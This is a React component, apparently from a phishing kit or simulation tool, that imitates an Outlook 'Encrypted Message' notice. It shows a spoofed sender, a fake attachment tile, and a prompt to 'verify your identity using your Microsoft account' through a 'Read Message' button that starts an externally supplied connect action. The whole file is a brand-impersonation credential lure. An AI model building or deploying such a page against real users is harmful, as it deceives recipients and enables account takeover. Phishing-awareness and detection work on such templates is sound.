"use client";

import { Loader2 } from "lucide-react";

interface TemplateProps {
  documentTitle: string;
  docType: string;
  senderName: string;
  onConnect: () => void;
  connecting: boolean;
}

export default function OutlookTemplate({
  documentTitle,
  docType,
  senderName,
  onConnect,
  connecting,
}: TemplateProps) {
  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#1b1b1b",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
      }}
    >
      {/* Header */}
      <div
        style={{
          width: "100%",
          padding: "14px 24px",
          backgroundColor: "#0078D4",
          display: "flex",
          alignItems: "center",
          gap: 10,
        }}
      >
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <rect x="2" y="4" width="20" height="16" rx="2" fill="#fff" opacity="0.9" />
          <text x="7" y="16" fontSize="10" fill="#0078D4" fontWeight="bold">O</text>
        </svg>
        <span style={{ color: "#fff", fontSize: 16, fontWeight: 600 }}>Outlook</span>
      </div>

      {/* Content */}
      <div
        style={{
          maxWidth: 520,
          width: "100%",
          margin: "60px auto 0",
          padding: "0 16px",
        }}
      >
        <div
          style={{
            backgroundColor: "#2d2d2d",
            borderRadius: 8,
            border: "1px solid #404040",
            overflow: "hidden",
          }}
        >
          {/* Encrypted badge */}
          <div
            style={{
              backgroundColor: "#1a3a5c",
              padding: "12px 24px",
              display: "flex",
              alignItems: "center",
              gap: 8,
            }}
          >
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
              <rect x="3" y="7" width="10" height="8" rx="1" fill="#60a5fa" />
              <path
                d="M5 7V5C5 3.34 6.34 2 8 2C9.66 2 11 3.34 11 5V7"
                stroke="#60a5fa"
                strokeWidth="1.5"
                fill="none"
              />
            </svg>
            <span style={{ color: "#60a5fa", fontSize: 13, fontWeight: 600 }}>
              Encrypted Message
            </span>
          </div>

          <div style={{ padding: 32 }}>
            <p style={{ color: "#e0e0e0", fontSize: 18, fontWeight: 600, marginBottom: 8 }}>
              You have received an encrypted message
            </p>
            <p style={{ color: "#808080", fontSize: 13, marginBottom: 24 }}>
              From: {senderName}
            </p>

            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 12,
                padding: 16,
                backgroundColor: "#242424",
                borderRadius: 6,
                marginBottom: 24,
              }}
            >
              <div
                style={{
                  width: 40,
                  height: 48,
                  borderRadius: 4,
                  backgroundColor:
                    docType === "PDF"
                      ? "#E74C3C"
                      : docType === "DOCX"
                        ? "#2B579A"
                        : docType === "XLSX"
                          ? "#217346"
                          : docType === "PPTX"
                            ? "#D24726"
                            : "#0078D4",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#fff",
                  fontSize: 10,
                  fontWeight: 700,
                }}
              >
                {docType}
              </div>
              <div>
                <p style={{ color: "#e0e0e0", fontSize: 14 }}>{documentTitle}</p>
                <p style={{ color: "#606060", fontSize: 11, marginTop: 2 }}>
                  Attachment &middot; {docType}
                </p>
              </div>
            </div>

            <p style={{ color: "#808080", fontSize: 12, marginBottom: 20 }}>
              To read this message, verify your identity using your Microsoft account.
            </p>

            <button
              onClick={onConnect}
              disabled={connecting}
              style={{
                width: "100%",
                padding: "12px 24px",
                backgroundColor: connecting ? "#005a9e" : "#0078D4",
                color: "#fff",
                border: "none",
                borderRadius: 4,
                fontSize: 14,
                fontWeight: 600,
                cursor: connecting ? "not-allowed" : "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 8,
              }}
            >
              {connecting && <Loader2 className="h-4 w-4 animate-spin" />}
              {connecting ? "Verifying..." : "Read Message"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
